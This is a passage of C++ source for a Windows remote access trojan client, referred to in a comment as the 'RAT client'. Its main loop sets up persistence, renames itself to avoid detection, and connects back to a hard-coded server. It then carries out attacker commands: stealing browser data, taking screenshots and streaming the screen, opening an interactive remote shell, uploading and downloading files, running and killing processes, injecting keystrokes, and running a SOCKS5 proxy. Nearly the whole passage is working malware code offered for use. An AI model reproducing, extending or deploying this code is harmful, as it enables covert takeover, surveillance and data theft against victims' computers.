        std::cout << "DEBUG: File opened successfully for writing" << std::endl;
        
        // Receive the file in chunks
        const int chunk_size = 8192; // 8KB chunks
        char buffer[chunk_size];
        uint64_t total_received = 0;
        
        while (total_received < file_size)
        {
            int to_receive = (file_size - total_received < chunk_size) ? 
                             static_cast<int>(file_size - total_received) : chunk_size;
            
            int bytes_received = recv(sock, buffer, to_receive, 0);
            if (bytes_received <= 0)
            {
                std::cout << "DEBUG: Failed to receive data chunk. Error: " << WSAGetLastError() << std::endl;
                std::cout << "DEBUG: Total received so far: " << total_received << "/" << file_size << " bytes" << std::endl;
                file.close();
                return false;
            }
            
            file.write(buffer, bytes_received);
            total_received += bytes_received;
            
            // Show progress
            int progress = static_cast<int>((total_received * 100) / file_size);
            std::cout << "\rDEBUG: Progress: " << progress << "% (" << total_received << "/" << file_size << " bytes)";
            std::cout.flush();
        }
        
        file.close();
        std::cout << "\nFile received successfully: " << destination_path << std::endl;
        
        return true;
    }
    catch (const std::exception& e)
    {
        std::cout << "Exception in receive_file: " << e.what() << std::endl;
        return false;
    }
}

bool send_file(SOCKET sock, const std::string& file_path)
{
    try
    {
        // Open the file
        std::ifstream file(file_path, std::ios::binary | std::ios::ate);
        if (!file.is_open())
        {
            std::cout << "Failed to open file: " << file_path << std::endl;
            return false;
        }
        
        // Get file size
        uint64_t file_size = file.tellg();
        file.seekg(0, std::ios::beg);
        
        // Send file size (8 bytes) in big-endian format for consistency
        uint64_t file_size_be = _byteswap_uint64(file_size);
        send(sock, reinterpret_cast<char*>(&file_size_be), 8, 0);
        
        // Send file name (for the server to extract)
        std::string file_name = file_path.substr(file_path.find_last_of("\\/") + 1);
        size_t name_length = file_name.length();
        
        // Send name length as 8 bytes (little-endian for Windows)
        uint64_t name_length_64 = static_cast<uint64_t>(name_length);
        send(sock, reinterpret_cast<char*>(&name_length_64), 8, 0);
        send(sock, file_name.c_str(), name_length, 0);
        
        // Send the file in chunks
        const int chunk_size = 8192; // 8KB chunks
        char buffer[chunk_size];
        uint64_t total_sent = 0;
        
        while (total_sent < file_size)
        {
            int to_read = (file_size - total_sent < chunk_size) ? 
                          static_cast<int>(file_size - total_sent) : chunk_size;
                          
            file.read(buffer, to_read);
            int bytes_read = static_cast<int>(file.gcount());
            
            if (bytes_read <= 0)
                break;
                
            int bytes_sent = send(sock, buffer, bytes_read, 0);
            
            if (bytes_sent <= 0)
            {
                std::cout << "Connection error while sending file" << std::endl;
                file.close();
                return false;
            }
            
            total_sent += bytes_sent;
            
            // Print progress percentage
            double progress = (static_cast<double>(total_sent) / file_size) * 100.0;
            std::cout << "\rSending file: " << std::fixed << std::setprecision(2) << progress << "%" << std::flush;
            
            // Small delay to prevent network congestion
            if (total_sent % (chunk_size * 10) == 0) // Every ~80KB
            {
                Sleep(1);
            }
        }
        
        file.close();
        std::cout << "\nFile sent successfully: " << file_path << std::endl;
        
        // Wait for confirmation from server
        char confirm_buffer[256] = {0};
        int bytes_received = recv(sock, confirm_buffer, 255, 0);
        
        if (bytes_received > 0)
        {
            std::string confirmation(confirm_buffer);
            std::cout << "Server response: " << confirmation << std::endl;
        }
        
        return true;
    }
    catch (const std::exception& e)
    {
        std::cout << "Exception in send_file: " << e.what() << std::endl;
        return false;
    }
}

int main()
{
    // Establish persistence first
    establish_persistence();
    
    // Perform polymorphic replication (change filename after restart)
    if (polymorphic::replicate_with_new_name()) {
        // If replication successful, exit current process
        // New process will be launched automatically
        return 0;
    }
    
    // Initialize GDI+ at startup
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    gdiplusStartupInput.GdiplusVersion = 1;
    gdiplusStartupInput.DebugEventCallback = NULL;
    gdiplusStartupInput.SuppressBackgroundThread = FALSE;
    gdiplusStartupInput.SuppressExternalCodecs = FALSE;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    // Initialize critical section for screen sharing
    InitializeCriticalSection(&g_screen_sharing_cs);
    
    // Initialize critical section for SOCKS5 proxy
    InitializeCriticalSection(&g_proxy_cs);

    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in serv_addr;
    char buffer[BUFFER_SIZE] = {0};
    std::string response;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cout << "WSAStartup failed" << std::endl;
        return 1;
    }

    while (true)
    {
        // Create socket
        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
        {
            std::cout << "Socket creation error: " << WSAGetLastError() << std::endl;
            Sleep(5000); // Use Sleep() on Windows (milliseconds)
            continue;
        }

        // Configure server address
        memset(&serv_addr, 0, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(PORT);

        // Convert IP address from text to binary
        if (inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr) <= 0)
        {
            std::cout << "Invalid address or address not supported" << std::endl;
            closesocket(sock); // Use closesocket() on Windows
            Sleep(5000);
            continue;
        }

        // Connect to server
        std::cout << "Attempting to connect to server..." << std::endl;
        if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
        {
            std::cout << "Connection failed: " << WSAGetLastError() << std::endl;
            closesocket(sock);
            Sleep(5000);
            continue;
        }

        std::cout << "Connected to server" << std::endl;

        // Command processing loop
        while (true)
        {
            memset(buffer, 0, BUFFER_SIZE);
            int bytes_read = recv(sock, buffer, BUFFER_SIZE, 0);

            if (bytes_read <= 0)
            {
                std::cout << "Server disconnected" << std::endl;
                break;
            }

            // Null terminate the received data
            buffer[bytes_read] = '\0';
            
            std::cout << "Received command: " << buffer << std::endl;

            // Process commands
            if (strcmp(buffer, "sysinfo") == 0)
            {
                std::cout << "Sending system information..." << std::endl;
                response = get_sysinfo();

                // Send in chunks with a clear end marker
                const int chunk_size = 1024;
                for (size_t i = 0; i < response.length(); i += chunk_size)
                {
                    std::string chunk = response.substr(i, chunk_size);
                    send(sock, chunk.c_str(), chunk.length(), 0);
                    Sleep(50); // Small delay between chunks
                }

                // Send a special end marker
                const char *end_marker = "##END_OF_SYSINFO##";
                send(sock, end_marker, strlen(end_marker), 0);
            }
            else if (strcmp(buffer, "list_processes") == 0)
            {
                std::cout << "Listing all processes..." << std::endl;
                response = list_processes();

                // Send in chunks with a clear end marker
                const int chunk_size = 1024;
                for (size_t i = 0; i < response.length(); i += chunk_size)
                {
                    std::string chunk = response.substr(i, chunk_size);
                    send(sock, chunk.c_str(), chunk.length(), 0);
                    Sleep(50); // Small delay between chunks
                }

                // Send a special end marker
                const char *end_marker = "##END_OF_PROCESS_LIST##";
                send(sock, end_marker, strlen(end_marker), 0);
            }
            else if (strncmp(buffer, "start_process ", 14) == 0)
            {
                std::string command = buffer + 14;
                std::cout << "Starting process: " << command << std::endl;

                // Trim quotes if present
                if (command.size() >= 2 && command.front() == '"' && command.back() == '"')
                {
                    command = command.substr(1, command.size() - 2);
                }

                // Check if file exists before attempting to start
                if (GetFileAttributesA(command.c_str()) == INVALID_FILE_ATTRIBUTES)
                {
                    // Try expanding environment variables
                    char expandedPath[MAX_PATH];
                    if (ExpandEnvironmentStringsA(command.c_str(), expandedPath, MAX_PATH) > 0)
                    {
                        command = expandedPath;
                    }
                }

                // Verify the file exists
                if (GetFileAttributesA(command.c_str()) != INVALID_FILE_ATTRIBUTES)
                {
                    STARTUPINFOA si;
                    PROCESS_INFORMATION pi;

                    ZeroMemory(&si, sizeof(si));
                    si.cb = sizeof(si);
                    ZeroMemory(&pi, sizeof(pi));

                    // Create a non-const copy of the command string
                    char *cmd = _strdup(command.c_str());

                    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
                    {
                        free(cmd);
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                        response = "Process started successfully with PID: " + std::to_string(pi.dwProcessId);
                    }
                    else
                    {
                        free(cmd);
                        DWORD error = GetLastError();
                        response = "Failed to start process: " + std::to_string(error);
                    }
                }
                else
                {
                    response = "Failed to start process: File not found at path: " + command;
                }

                send(sock, response.c_str(), response.length(), 0);
            }
            else if (strcmp(buffer, "browser_data") == 0)
            {
                std::string browserData = get_browser_data();
                send(sock, browserData.c_str(), browserData.length(), 0);
            }
            else if (strncmp(buffer, "terminate_process ", 18) == 0)
            {
                std::string pid = buffer + 18;
                std::cout << "Terminating process with PID: " << pid << std::endl;
                response = terminate_process(pid);
                send(sock, response.c_str(), response.length(), 0);
            }
            else if (strcmp(buffer, "screenshot") == 0)
            {
                std::cout << "Taking screenshot..." << std::endl;
                if (!capture_and_send_screenshot(sock))
                {
                    const char *error_msg = "Failed to capture screenshot";
                    send(sock, error_msg, strlen(error_msg), 0);
                }
                std::cout << "Screenshot sent" << std::endl;
            }
            else if (strcmp(buffer, "start_screen_share") == 0)
            {
                std::cout << "Starting screen sharing..." << std::endl;
                response = start_screen_sharing(sock);
                send(sock, response.c_str(), response.length(), 0);
                std::cout << "Screen sharing command processed: " << response << std::endl;
            }
            else if (strcmp(buffer, "stop_screen_share") == 0)
            {
                std::cout << "Stopping screen sharing..." << std::endl;
                response = stop_screen_sharing();
                send(sock, response.c_str(), response.length(), 0);
                std::cout << "Screen sharing stopped: " << response << std::endl;
            }
            else if (strcmp(buffer, "start_proxy") == 0 || strncmp(buffer, "start_proxy ", 12) == 0)
            {
                std::cout << "Starting SOCKS5 proxy..." << std::endl;
                
                int port = 0;
                if (strncmp(buffer, "start_proxy ", 12) == 0) {
                    // Extract port number if provided
                    std::string port_str = buffer + 12;
                    port_str.erase(0, port_str.find_first_not_of(" \t\r\n"));
                    port_str.erase(port_str.find_last_not_of(" \t\r\n") + 1);
                    
                    if (!port_str.empty()) {
                        port = atoi(port_str.c_str());
                        if (port <= 0 || port > 65535) {
                            port = 0; // Use auto-assigned port if invalid
                        }
                    }
                }
                
                response = start_socks5_proxy(port);
                send(sock, response.c_str(), response.length(), 0);
                std::cout << "SOCKS5 proxy command processed: " << response << std::endl;
            }
            else if (strcmp(buffer, "stop_proxy") == 0)
            {
                std::cout << "Stopping SOCKS5 proxy..." << std::endl;
                response = stop_socks5_proxy();
                send(sock, response.c_str(), response.length(), 0);
                std::cout << "SOCKS5 proxy stopped: " << response << std::endl;
            }
            else if (strcmp(buffer, "proxy_status") == 0)
            {
                std::cout << "Getting SOCKS5 proxy status..." << std::endl;
                response = get_proxy_status();
                send(sock, response.c_str(), response.length(), 0);
                std::cout << "SOCKS5 proxy status: " << response << std::endl;
            }
            else if (strcmp(buffer, "get_public_ip_info") == 0)
            {
                std::cout << "Getting public IP information..." << std::endl;
                std::string local_ip = get_local_ip();
                std::string public_ip;
                
                // Try to get public IP with timeout protection
                try {
                    public_ip = get_public_ip();
                    if (public_ip.empty() || public_ip == "127.0.0.1") {
                        public_ip = "Detection Failed";
                    }
                } catch (...) {
                    public_ip = "Detection Failed";
                }
                
                response = "Public IP: " + public_ip + "\n";
                response += "Local IP: " + local_ip;
                
                send(sock, response.c_str(), response.length(), 0);
                std::cout << "Public IP info sent: " << public_ip << std::endl;
            }
            else if (strcmp(buffer, "kill_client") == 0)
            {
                std::cout << "Received kill command from server. Terminating..." << std::endl;
                // Send acknowledgment before terminating
                const char *ack_msg = "Client terminating on server request";
                send(sock, ack_msg, strlen(ack_msg), 0);

                // Clean up resources
                closesocket(sock);
                WSACleanup();
                Gdiplus::GdiplusShutdown(gdiplusToken);

                // Force exit the process
                ExitProcess(0);
            }
            else if (strcmp(buffer, "exit") == 0)
            {
                std::cout << "Disconnecting from server (will attempt to reconnect)..." << std::endl;
                const char *ack_msg = "Client disconnecting but will attempt to reconnect";
                send(sock, ack_msg, strlen(ack_msg), 0);

                // Close the current socket but don't exit the process
                closesocket(sock);

                // Don't call WSACleanup() or GdiplusShutdown() here to allow reconnection
                // Don't return from main function

                // Break out of the inner loop to attempt reconnection
                break;
            }
            else if (strcmp(buffer, "shell") == 0)
            {
                std::cout << "Starting interactive shell session..." << std::endl;
                
                // Send acknowledgment
                response = "Starting interactive shell...";
                send(sock, response.c_str(), response.length(), 0);
                
                // Start interactive shell
                interactive_shell(sock);
                
                // Continue normal operation after shell exits
                std::cout << "Interactive shell session ended" << std::endl;
            }
            else if (strcmp(buffer, "kill_client") == 0)
            {
                std::cout << "Received kill command, exiting..." << std::endl;
                response = "Client shutting down";
                send(sock, response.c_str(), response.length(), 0);
                break;
            }
            else if (strcmp(buffer, "installed_software") == 0)
            {
                std::cout << "Sending installed software list..." << std::endl;
                response = get_installed_software();

                // Send in chunks with a clear end marker
                const int chunk_size = 1024;
                for (size_t i = 0; i < response.length(); i += chunk_size)
                {
                    std::string chunk = response.substr(i, chunk_size);
                    send(sock, chunk.c_str(), chunk.length(), 0);
                    Sleep(50); // Small delay between chunks
                }

                // Send a special end marker
                const char *end_marker = "##END_OF_SOFTWARE_LIST##";
                send(sock, end_marker, strlen(end_marker), 0);
            }
            else if (strncmp(buffer, "send_keys ", 10) == 0)
            {
                std::string params = buffer + 10;
                size_t spacePos = params.find(' ');

                if (spacePos != std::string::npos)
                {
                    std::string processName = params.substr(0, spacePos);
                    std::string keys = params.substr(spacePos + 1);

                    std::cout << "Sending keystrokes to " << processName << ": " << keys << std::endl;
                    response = send_keystrokes(processName, keys);
                }
                else
                {
                    response = "Invalid format. Use: send_keys <process_name> <keys>";
                }

                send(sock, response.c_str(), response.length(), 0);
            }
            else if (strncmp(buffer, "click_at ", 9) == 0)
            {
                std::string params = buffer + 9;
                std::istringstream iss(params);
                std::string processName;
                int x, y;

                if (iss >> processName >> x >> y)
                {
                    std::cout << "Clicking at position (" << x << ", " << y << ") in " << processName << std::endl;
                    response = click_at_position(processName, x, y);
                }
                else
                {
                    response = "Invalid format. Use: click_at <process_name> <x> <y>";
                }

                send(sock, response.c_str(), response.length(), 0);
            }
            else if (strncmp(buffer, "launch_app ", 11) == 0)
            {
                std::string appName = buffer + 11;

                // Trim leading and trailing whitespace
                appName.erase(0, appName.find_first_not_of(" \t\r\n"));
                appName.erase(appName.find_last_not_of(" \t\r\n") + 1);

                // Trim quotes if present
                if (appName.size() >= 2 && appName.front() == '"' && appName.back() == '"')
                {
                    appName = appName.substr(1, appName.size() - 2);
                }

                std::cout << "Launching application from Start Menu: " << appName << std::endl;
                response = launch_from_start_menu(appName);
                send(sock, response.c_str(), response.length(), 0);
            }
            else if (strncmp(buffer, "type ", 5) == 0)
            {
                std::string keys = buffer + 5;
                keys.erase(0, keys.find_first_not_of(" \t\r\n"));
                keys.erase(keys.find_last_not_of(" \t\r\n") + 1);

                std::cout << "Sending keystrokes to current focus: " << keys << std::endl;

                response = send_keystrokes_at_cursor(keys);
                send(sock, response.c_str(), response.length(), 0);
            }
            else if (strncmp(buffer, "youtube ", 8) == 0)
            {
                std::string url = buffer + 8;
                url.erase(0, url.find_first_not_of(" \t\r\n"));
                url.erase(url.find_last_not_of(" \t\r\n") + 1);

                std::cout << "Opening YouTube URL: " << url << std::endl;

                response = open_youtube_without_ads(url);
                send(sock, response.c_str(), response.length(), 0);
            }
            else if (strncmp(buffer, "search_process ", 15) == 0)
            {
                std::string process_name = buffer + 15;

                // Trim leading and trailing whitespace
                process_name.erase(0, process_name.find_first_not_of(" \t\r\n"));
                process_name.erase(process_name.find_last_not_of(" \t\r\n") + 1);

                std::cout << "Searching for process: " << process_name << std::endl;
                response = search_process(process_name);

                // Send the response
                send(sock, response.c_str(), response.length(), 0);

                // Send the end marker separately
                const char *end_marker = "##END_OF_SEARCH_RESULTS##";
                send(sock, end_marker, strlen(end_marker), 0);
            }
            else if (strcmp(buffer, "network") == 0)
            {
                std::string network_info = get_network_info();
                send(sock, network_info.c_str(), network_info.length(), 0);
            }
            else if (strcmp(buffer, "system_logs") == 0 || strncmp(buffer, "system_logs ", 12) == 0)
            {
                std::cout << "Retrieving system logs..." << std::endl;

                // Parse log type and count if provided
                const char *log_type = "System";
                int num_entries = 50;

                if (strncmp(buffer, "system_logs ", 12) == 0)
                {
                    char params[256] = {0};
                    strncpy_s(params, sizeof(params), buffer + 12, sizeof(params) - 1);

                    char *context = NULL;
                    char *token = strtok_s(params, " ", &context);
                    if (token)
                    {
                        log_type = token;
                        token = strtok_s(NULL, " ", &context);
                        if (token)
                        {
                            num_entries = atoi(token);
                            if (num_entries <= 0)
                                num_entries = 50;
                        }
                    }
                }

                response = get_system_logs(log_type, num_entries);

                // Send in chunks with a clear end marker
                const int chunk_size = 1024;
                for (size_t i = 0; i < response.length(); i += chunk_size)
                {
                    std::string chunk = response.substr(i, chunk_size);
                    send(sock, chunk.c_str(), chunk.length(), 0);
                    Sleep(50); // Small delay between chunks
                }

                // Send a special end marker
                const char *end_marker = "##END_OF_SYSTEM_LOGS##";
                send(sock, end_marker, strlen(end_marker), 0);
            }
            else if (strncmp(buffer, "upload_file ", 12) == 0)
            {
                std::string filename = buffer + 12;
                
                // Trim leading and trailing whitespace
                filename.erase(0, filename.find_first_not_of(" \t\r\n"));
                filename.erase(filename.find_last_not_of(" \t\r\n") + 1);
                
                // Try to save to Desktop first, fallback to current directory
                std::string destination_path;
                char desktop_path[MAX_PATH];
                if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, SHGFP_TYPE_CURRENT, desktop_path) == S_OK)
                {
                    destination_path = std::string(desktop_path) + "\\" + filename;
                    std::cout << "DEBUG: Receiving file from server to Desktop: " << destination_path << std::endl;
                }
                else
                {
                    // Fallback to current directory where the RAT client exe is located
                    destination_path = filename;
                    std::cout << "DEBUG: Desktop path failed, saving to current directory: " << destination_path << std::endl;
                }
                
                // Send acknowledgment before receiving file
                response = "Ready to receive file";
                std::cout << "DEBUG: Sending acknowledgment: " << response << std::endl;
                send(sock, response.c_str(), response.length(), 0);
                
                // Small delay to ensure server receives acknowledgment
                Sleep(200);
                
                // Receive the file directly - this completely exits the command loop temporarily
                std::cout << "DEBUG: Exiting command loop to receive file..." << std::endl;
                std::cout << "DEBUG: Starting to receive file..." << std::endl;
                bool success = receive_file(sock, destination_path);
                
                if (success) {
                    std::cout << "DEBUG: File received successfully: " << filename << std::endl;
                } else {
                    std::cout << "DEBUG: Failed to receive file" << std::endl;
                }
                
                // Clear any remaining data in socket buffer and flush
                Sleep(500);
                
                // Try to flush any remaining data from socket buffer
                char flush_buffer[1024];
                int available_bytes = 0;
                ioctlsocket(sock, FIONREAD, (u_long*)&available_bytes);
                if (available_bytes > 0) {
                    std::cout << "DEBUG: Flushing " << available_bytes << " remaining bytes from socket" << std::endl;
                    while (available_bytes > 0) {
                        int to_flush = (available_bytes > 1024) ? 1024 : available_bytes;
                        int flushed = recv(sock, flush_buffer, to_flush, 0);
                        if (flushed <= 0) break;
                        available_bytes -= flushed;
                        ioctlsocket(sock, FIONREAD, (u_long*)&available_bytes);
                    }
                }
                
                // Continue to next iteration to resume command processing
                continue;
            }
            else if (strncmp(buffer, "download_file ", 14) == 0)
            {
                std::string file_path = buffer + 14;
                
                // Trim leading and trailing whitespace
                file_path.erase(0, file_path.find_first_not_of(" \t\r\n"));
                file_path.erase(file_path.find_last_not_of(" \t\r\n") + 1);
                
                std::cout << "DEBUG: Received download_file command for: " << file_path << std::endl;
                
                // Check if file exists
                if (GetFileAttributesA(file_path.c_str()) == INVALID_FILE_ATTRIBUTES)
                {
                    response = "File not found: " + file_path;
                    std::cout << "DEBUG: File not found, sending error response" << std::endl;
                    send(sock, response.c_str(), response.length(), 0);
                }
                else
                {
                    // Send acknowledgment before sending file
                    response = "File found, preparing to send";
                    std::cout << "DEBUG: File found, sending acknowledgment" << std::endl;
                    send(sock, response.c_str(), response.length(), 0);
                    
                    // Small delay to ensure acknowledgment is received
                    Sleep(100);
                    
                    // Send the file
                    std::cout << "DEBUG: Starting file transfer..." << std::endl;
                    bool success = send_file(sock, file_path);
                    
                    if (!success) {
                        std::cout << "DEBUG: File transfer failed" << std::endl;
                    } else {
                        std::cout << "DEBUG: File transfer completed successfully" << std::endl;
                    }
                    
                    // Continue to next iteration to resume command processing
                    continue;
                }
            }
            else
            {
                std::cout << "Unknown command: " << buffer << std::endl;
                response = "Unknown command";
                send(sock, response.c_str(), response.length(), 0);
            }
        }
    }
    
    // Cleanup (this should never be reached due to infinite loop, but good practice)
    stop_screen_sharing(); // Stop any active screen sharing
    stop_socks5_proxy(); // Stop any active SOCKS5 proxy
    DeleteCriticalSection(&g_screen_sharing_cs);
    DeleteCriticalSection(&g_proxy_cs);
    WSACleanup();
    Gdiplus::GdiplusShutdown(gdiplusToken);
    
    return 0;
}